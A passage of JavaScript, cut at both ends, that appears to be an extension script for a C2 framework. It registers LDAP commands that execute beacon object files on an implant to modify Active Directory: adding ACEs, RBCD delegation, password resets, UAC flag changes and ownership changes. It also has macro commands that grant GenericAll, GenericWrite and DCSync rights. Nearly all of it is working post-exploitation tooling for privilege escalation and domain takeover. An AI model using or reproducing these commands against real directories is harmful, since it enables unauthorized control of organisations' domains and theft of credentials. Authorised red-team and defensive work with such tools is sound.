    "ldap add-delegation machine01 RestrictedKrbHost/machine01.domain.local -ou \"OU=Computers,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_adddelegation.addArgString("target", true, "Object name or DN");
_cmd_adddelegation.addArgString("spn", true, "Delegation SPN to add");
_cmd_adddelegation.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_adddelegation.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_adddelegation.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_adddelegation.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let spn = parsed_json["spn"];
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,int", [target, is_dn, spn, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/add-delegation." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Adding delegation SPN to ${target}...`);
});



var _cmd_addace = ax.create_command(
    "add-ace",
    "Add an ACE to an object's DACL",
    "ldap add-ace CN=SomeObject,OU=Data,DC=domain,DC=local jane.doe WRITE -dc dc01.domain.local"
);
_cmd_addace.addArgString("target", true, "Target object name or DN");
_cmd_addace.addArgString("trustee", true, "Trustee name or DN");
_cmd_addace.addArgString("rights", true, "Access rights (e.g., GenericAll, WriteDacl)");
_cmd_addace.addArgFlagString("-type", "ace_type", false, "ACE type: allow (default), deny");
_cmd_addace.addArgFlagString("-flags", "flags", false, "ACE inheritance flags (e.g., CI,OI)");
_cmd_addace.addArgFlagString("-guid", "guid", false, "Object type GUID");
_cmd_addace.addArgFlagString("-inherit-guid", "inherit_guid", false, "Inherited object type GUID");
_cmd_addace.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_addace.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_addace.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_addace.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_target_dn = identifyInputType(target);
    let trustee = parsed_json["trustee"];
    let is_trustee_dn = identifyInputType(trustee);
    let rights = parsed_json["rights"];
    let ace_type = parsed_json["ace_type"] || "";
    let flags = parsed_json["flags"] || "";
    let guid = parsed_json["guid"] || "";
    let inherit_guid = parsed_json["inherit_guid"] || "";
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,int,cstr,cstr,cstr,cstr,cstr,cstr,cstr,int",
        [target, is_target_dn, trustee, is_trustee_dn, rights, ace_type, flags, guid, inherit_guid, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/add-ace." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Adding ACE to ${target}...`);
});



var _cmd_addrbcd = ax.create_command(
    "add-rbcd",
    "Add an RBCD delegation",
    "ldap add-rbcd targetComputer$ principalAccount$ -ou \"OU=Computers,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_addrbcd.addArgString("target", true, "Target object name or DN");
_cmd_addrbcd.addArgString("delegate", true, "Object allowed to delegate");
_cmd_addrbcd.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_addrbcd.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_addrbcd.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_addrbcd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_target_dn = identifyInputType(target);
    let delegate = parsed_json["delegate"];
    let is_delegate_dn = identifyInputType(delegate);
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,int,cstr,cstr,int",
        [target, is_target_dn, delegate, is_delegate_dn, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/add-rbcd." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Adding RBCD delegation to ${target}...`);
});



// ============================================================================
// SET COMMANDS
// ============================================================================

var _cmd_setpassword = ax.create_command(
    "set-password",
    "Set/reset a user's password",
    "ldap set-password jane.doe 'N3wP@ssw0rd!' -old 'OldP@ss' -ou \"OU=Users,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_setpassword.addArgString("target", true, "User name or DN");
_cmd_setpassword.addArgString("password", true, "New password");
_cmd_setpassword.addArgFlagString("-old", "old_password", false, "Old password (required for self-service password change, omit for admin reset)");
_cmd_setpassword.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_setpassword.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_setpassword.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let password = parsed_json["password"];
    let old_password = parsed_json["old_password"] || "";
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = 1; // Always use LDAPS for password operations

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,cstr,int", [target, is_dn, password, old_password, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/set-password." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Setting password for ${target}...`);
});



var _cmd_setspn = ax.create_command(
    "set-spn",
    "Set/replace all SPNs on an object",
    "ldap set-spn machine01$ HOST/machine01.domain.local -dc dc01.domain.local --ldaps"
);
_cmd_setspn.addArgString("target", true, "Object name or DN");
_cmd_setspn.addArgString("spn", true, "SPN to set (replaces all existing)");
_cmd_setspn.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_setspn.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_setspn.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_setspn.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let spn = parsed_json["spn"];
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,int", [target, is_dn, spn, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/set-spn." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Setting SPN on ${target}...`);
});



var _cmd_setdelegation = ax.create_command(
    "set-delegation",
    "Set/replace delegation SPNs",
    "ldap set-delegation appsvc RestrictedKrbHost/appsvc.domain.local -dc dc01.domain.local --ldaps"
);
_cmd_setdelegation.addArgString("target", true, "Object name or DN");
_cmd_setdelegation.addArgString("spn", true, "Delegation SPN (replaces all existing)");
_cmd_setdelegation.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_setdelegation.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_setdelegation.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_setdelegation.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let spn = parsed_json["spn"];
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,int", [target, is_dn, spn, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/set-delegation." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Setting delegation on ${target}...`);
});



var _cmd_setattribute = ax.create_command(
    "set-attribute",
    "Set/replace an attribute value",
    "ldap set-attribute jane.doe description 'File found' -ou \"OU=Users,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_setattribute.addArgString("target", true, "Object name or DN");
_cmd_setattribute.addArgString("attribute", true, "Attribute name");
_cmd_setattribute.addArgString("value", true, "Value to set");
_cmd_setattribute.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_setattribute.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_setattribute.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_setattribute.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let attribute = parsed_json["attribute"];
    let value = parsed_json["value"];
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,cstr,int",
        [target, is_dn, attribute, value, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/set-attribute." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Setting ${attribute} on ${target}...`);
});



var _cmd_setuac = ax.create_command(
    "set-uac",
    "Set UAC flags (replaces all)",
    "ldap set-uac jane.doe DONT_EXPIRE_PASSWD -ou \"OU=Users,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_setuac.addArgString("target", true, "Object name or DN");
_cmd_setuac.addArgString("flags", true, "Comma-separated UAC flags (replaces all): SCRIPT, ACCOUNTDISABLE, HOMEDIR_REQUIRED, LOCKOUT, PASSWD_NOTREQD, PASSWD_CANT_CHANGE, NORMAL_ACCOUNT, INTERDOMAIN_TRUST_ACCOUNT, WORKSTATION_TRUST_ACCOUNT" +
    "SERVER_TRUST_ACCOUNT, DONT_EXPIRE_PASSWD, SMARTCARD_REQUIRED, TRUSTED_FOR_DELEGATION, NOT_DELEGATED, USE_DES_KEY_ONLY, DONT_REQ_PREAUTH, PASSWORD_EXPIRED, TRUSTED_TO_AUTH_FOR_DELEGATION, NO_AUTH_DATA_REQUIRED");
_cmd_setuac.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_setuac.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_setuac.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_setuac.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let flags = parsed_json["flags"];
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,int", [target, is_dn, flags, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/set-uac." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Setting UAC flags on ${target}...`);
});



var _cmd_setowner = ax.create_command(
    "set-owner",
    "Set the owner of an object (requires WriteOwner)",
    "ldap set-owner cn=resource,ou=apps,dc=domain,dc=local cn=jane.doe,ou=Users,dc=domain,dc=local -dc dc01.domain.local"
);
_cmd_setowner.addArgString("target", true, "Target object name or DN");
_cmd_setowner.addArgString("owner", true, "New owner name or DN");
_cmd_setowner.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_setowner.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_setowner.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_setowner.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_target_dn = identifyInputType(target);
    let owner = parsed_json["owner"];
    let is_owner_dn = identifyInputType(owner);
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,int,cstr,cstr,int",
        [target, is_target_dn, owner, is_owner_dn, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/set-owner." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Setting owner of ${target} to ${owner}...`);
});



// ============================================================================
// MOVE COMMANDS
// ============================================================================

var _cmd_moveobject = ax.create_command(
    "move-object",
    "Move an object to a different OU",
    "ldap move-object jane.doe \"OU=Managers,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_moveobject.addArgString("object", true, "Object name or DN to move");
_cmd_moveobject.addArgString("destination", true, "Destination OU DN");
_cmd_moveobject.addArgFlagString("-n", "newname", false, "New name for the object (optional)");
_cmd_moveobject.addArgFlagString("-ou", "ou_path", false, "OU path to search for object");
_cmd_moveobject.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_moveobject.addArgBool("--ldaps", "Use LDAPS (port 636)");

_cmd_moveobject.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let object = parsed_json["object"];
    let is_dn = identifyInputType(object);
    let destination = parsed_json["destination"];
    let newname = parsed_json["newname"] || "";
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,cstr,int", [object, is_dn, destination, newname, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/move-object." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Moving ${object} to ${destination}...`);
});



// ============================================================================
// REMOVE COMMANDS
// ============================================================================

var _cmd_removegroupmember = ax.create_command(
    "remove-groupmember",
    "Remove a member from a group",
    "ldap remove-groupmember Stark jane.doe -dc dc01.domain.local"
);
_cmd_removegroupmember.addArgString("group", true, "Group name or DN");
_cmd_removegroupmember.addArgString("member", true, "Member name or DN");
_cmd_removegroupmember.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_removegroupmember.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_removegroupmember.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_removegroupmember.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let group = parsed_json["group"];
    let is_group_dn = identifyInputType(group);
    let member = parsed_json["member"];
    let is_member_dn = identifyInputType(member);
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,int,cstr,cstr,int",
        [group, is_group_dn, member, is_member_dn, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/remove-groupmember." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Removing ${member} from ${group}...`);
});



var _cmd_removeobject = ax.create_command(
    "remove-object",
    "Remove an object from the domain",
    "ldap remove-object jane.doe -ou \"OU=Users,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_removeobject.addArgString("object", true, "Object name or DN");
_cmd_removeobject.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_removeobject.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_removeobject.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_removeobject.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let object = parsed_json["object"];
    let is_dn = identifyInputType(object);
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,int", [object, is_dn, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/remove-object." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Removing ${object}...`);
});



var _cmd_removespn = ax.create_command(
    "remove-spn",
    "Remove an SPN from an object",
    "ldap remove-spn machine01$ HOST/machine01.domain.local -dc dc01.domain.local"
);
_cmd_removespn.addArgString("target", true, "Object name or DN");
_cmd_removespn.addArgString("spn", true, "SPN to remove");
_cmd_removespn.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_removespn.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_removespn.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_removespn.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let spn = parsed_json["spn"];
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,int", [target, is_dn, spn, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/remove-spn." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Removing SPN ${spn} from ${target}...`);
});



var _cmd_removedelegation = ax.create_command(
    "remove-delegation",
    "Remove a delegation SPN",
    "ldap remove-delegation machine01$ RestrictedKrbHost/machine01.domain.local -dc dc01.domain.local"
);
_cmd_removedelegation.addArgString("target", true, "Object name or DN");
_cmd_removedelegation.addArgString("spn", true, "Delegation SPN to remove");
_cmd_removedelegation.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_removedelegation.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_removedelegation.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_removedelegation.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let spn = parsed_json["spn"];
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,int", [target, is_dn, spn, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/remove-delegation." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Removing delegation SPN from ${target}...`);
});



var _cmd_removeattribute = ax.create_command(
    "remove-attribute",
    "Remove an attribute or attribute value",
    "ldap remove-attribute jane.doe description -value 'File not found' -dc dc01.domain.local"
);
_cmd_removeattribute.addArgString("target", true, "Object name or DN");
_cmd_removeattribute.addArgString("attribute", true, "Attribute name");
_cmd_removeattribute.addArgFlagString("-value", "value", false, "Specific value to remove (removes entire attribute if not specified)");
_cmd_removeattribute.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_removeattribute.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_removeattribute.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_removeattribute.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let attribute = parsed_json["attribute"];
    let value = parsed_json["value"] || "";
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,cstr,int",
        [target, is_dn, attribute, value, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/remove-attribute." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Removing ${attribute} from ${target}...`);
});



var _cmd_removeuac = ax.create_command(
    "remove-uac",
    "Remove UAC flags from an object",
    "ldap remove-uac jane.doe DONT_EXPIRE_PASSWD -dc dc01.domain.local"
);
_cmd_removeuac.addArgString("target", true, "Object name or DN");
_cmd_removeuac.addArgString("flags", true, "Comma-separated UAC flags to remove");
_cmd_removeuac.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_removeuac.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_removeuac.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_removeuac.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let flags = parsed_json["flags"];
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,int", [target, is_dn, flags, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/remove-uac." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Removing UAC flags from ${target}...`);
});



var _cmd_removeace = ax.create_command(
    "remove-ace",
    "Remove an ACE from an object's DACL",
    "ldap remove-ace cn=SomeObject,OU=Data,DC=domain,DC=local -trustee jane.doe -dc dc01.domain.local"
);
_cmd_removeace.addArgString("target", true, "Target object name or DN");
_cmd_removeace.addArgFlagString("-trustee", "trustee", false, "Trustee name or DN to match (use instead of index)");
_cmd_removeace.addArgFlagString("-rights", "rights", false, "Access rights to match (optional, e.g., GenericAll, DCSync)");
_cmd_removeace.addArgFlagString("-type","ace_type", false, "ACE type to match (optional: allow, deny)");
_cmd_removeace.addArgFlagInt("-index","ace_index", false, "ACE index to remove (use get-acl to find index)");
_cmd_removeace.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_removeace.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_removeace.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_removeace.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){

    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let trustee = parsed_json["trustee"] || "";
    let is_trustee_dn = identifyInputType(trustee);
    let rights = parsed_json["rights"] || "";
    let ace_type = parsed_json["ace_type"] || "";
    let ace_index = parsed_json["ace_index"] || -1;
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,int,cstr,cstr,int,cstr,cstr,int",
        [target, is_dn, trustee, is_trustee_dn, rights, ace_type, ace_index, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/remove-ace." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Removing ACE from ${target}...`);
});



var _cmd_removerbcd = ax.create_command(
    "remove-rbcd",
    "Remove an RBCD delegation",
    "ldap remove-rbcd targetComputer principalAccount -dc dc01.domain.local"
);
_cmd_removerbcd.addArgString("target", true, "Target object name or DN");
_cmd_removerbcd.addArgString("delegate", true, "Object to remove from delegation");
_cmd_removerbcd.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_removerbcd.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_removerbcd.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_removerbcd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_target_dn = identifyInputType(target);
    let delegate = parsed_json["delegate"];
    let is_delegate_dn = identifyInputType(delegate);
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,int,cstr,cstr,int",
        [target, is_target_dn, delegate, is_delegate_dn, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/remove-rbcd." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Removing RBCD delegation from ${target}...`);
});



// ============================================================================
// MACRO COMMANDS (using existing BOFs with preset parameters)
// ============================================================================

var _cmd_addgenericall = ax.create_command(
    "add-genericall",
    "Add a GenericAll ACE to an object's DACL",
    "ldap add-genericall cn=SomeObject,OU=Data,DC=domain,DC=local jane.doe -dc dc01.domain.local"
);
_cmd_addgenericall.addArgString("target", true, "Target object name or DN");
_cmd_addgenericall.addArgString("trustee", true, "Trustee name or DN");
_cmd_addgenericall.addArgFlagString("-type", "ace_type", false, "ACE type: allow (default), deny");
_cmd_addgenericall.addArgFlagString("-flags", "flags", false, "ACE inheritance flags (e.g., CI,OI)");
_cmd_addgenericall.addArgFlagString("-guid", "guid", false, "Object type GUID");
_cmd_addgenericall.addArgFlagString("-inherit-guid", "inherit_guid", false, "Inherited object type GUID");
_cmd_addgenericall.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_addgenericall.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_addgenericall.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_addgenericall.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_target_dn = identifyInputType(target);
    let trustee = parsed_json["trustee"];
    let is_trustee_dn = identifyInputType(trustee);
    let rights = "GenericAll";
    let ace_type = parsed_json["ace_type"] || "";
    let flags = parsed_json["flags"] || "";
    let guid = parsed_json["guid"] || "";
    let inherit_guid = parsed_json["inherit_guid"] || "";
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,int,cstr,cstr,cstr,cstr,cstr,cstr,cstr,int",
        [target, is_target_dn, trustee, is_trustee_dn, rights, ace_type, flags, guid, inherit_guid, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/add-ace." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Adding ACE to ${target}...`);
});



var _cmd_addgenericwrite = ax.create_command(
    "add-genericwrite",
    "Add a GenericWrite ACE to an object's DACL",
    "ldap add-genericwrite cn=SomeObject,OU=Data,DC=domain,DC=local jane.doe -dc dc01.domain.local"
);
_cmd_addgenericwrite.addArgString("target", true, "Target object name or DN");
_cmd_addgenericwrite.addArgString("trustee", true, "Trustee name or DN");
_cmd_addgenericwrite.addArgFlagString("-type", "ace_type", false, "ACE type: allow (default), deny");
_cmd_addgenericwrite.addArgFlagString("-flags", "flags", false, "ACE inheritance flags (e.g., CI,OI)");
_cmd_addgenericwrite.addArgFlagString("-guid", "guid", false, "Object type GUID");
_cmd_addgenericwrite.addArgFlagString("-inherit-guid", "inherit_guid", false, "Inherited object type GUID");
_cmd_addgenericwrite.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_addgenericwrite.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_addgenericwrite.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_addgenericwrite.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_target_dn = identifyInputType(target);
    let trustee = parsed_json["trustee"];
    let is_trustee_dn = identifyInputType(trustee);
    let rights = "GenericWrite";
    let ace_type = parsed_json["ace_type"] || "";
    let flags = parsed_json["flags"] || "";
    let guid = parsed_json["guid"] || "";
    let inherit_guid = parsed_json["inherit_guid"] || "";
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,int,cstr,cstr,cstr,cstr,cstr,cstr,cstr,int",
        [target, is_target_dn, trustee, is_trustee_dn, rights, ace_type, flags, guid, inherit_guid, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/add-ace." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Adding ACE to ${target}...`);
});



var _cmd_adddcsync = ax.create_command(
    "add-dcsync",
    "Add DCSync ACEs to an object's DACL",
    "ldap add-dcsync DC=domain,DC=local jane.doe -dc dc01.domain.local"
);
_cmd_adddcsync.addArgString("target", true, "Target object name or DN");
_cmd_adddcsync.addArgString("trustee", true, "Trustee name or DN");
_cmd_adddcsync.addArgFlagString("-type", "ace_type", false, "ACE type: allow (default), deny");
_cmd_adddcsync.addArgFlagString("-flags", "flags", false, "ACE inheritance flags (e.g., CI,OI)");
_cmd_adddcsync.addArgFlagString("-guid", "guid", false, "Object type GUID");
